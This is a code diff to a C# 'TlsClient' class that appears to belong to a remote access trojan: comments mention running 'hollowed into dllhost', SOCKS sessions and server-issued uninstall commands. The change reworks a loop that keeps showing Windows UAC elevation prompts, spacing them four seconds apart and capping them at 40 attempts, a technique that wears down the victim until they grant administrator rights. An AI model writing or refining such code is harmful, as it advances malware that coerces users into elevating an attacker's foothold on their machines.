@@ -19,6 +19,8 @@ internal class TlsClient : IDisposable
     private readonly int _port;
     private readonly SemaphoreSlim _writeLock = new(1, 1);
     private readonly string _instanceId = Guid.NewGuid().ToString("N").Substring(0, 8);
+    // UAC loop counter — reset on each new server session, capped to avoid infinite popup spam
+    private int _uacLoopAttempts;
     private readonly HashSet<string> _socksInitiated = [];
 
     /// <summary>False after Disconnect/Uninstall — caller should NOT reconnect.</summary>
@@ -1187,6 +1189,7 @@ internal class TlsClient : IDisposable
         }
 
         bool elevated = false;
+        _uacLoopAttempts = 0;
         do
         {
             // Resolve exe path: prefer installed AppData copy (works even when hollowed into dllhost etc.)
@@ -1288,9 +1291,14 @@ internal class TlsClient : IDisposable
             }
 
             if (loop && !elevated)
-                await Task.Delay(3000, ct);
+            {
+                // Wait between attempts so only ONE popup shows at a time (no spam)
+                // 4s gives the user time to close/decline before the next one appears
+                await Task.Delay(4000, ct);
+            }
+            _uacLoopAttempts++;
 
-        } while (loop && !elevated && !ct.IsCancellationRequested);
+        } while (loop && !elevated && !ct.IsCancellationRequested && _uacLoopAttempts < 40);
     }
 
     private void HandleUninstall()
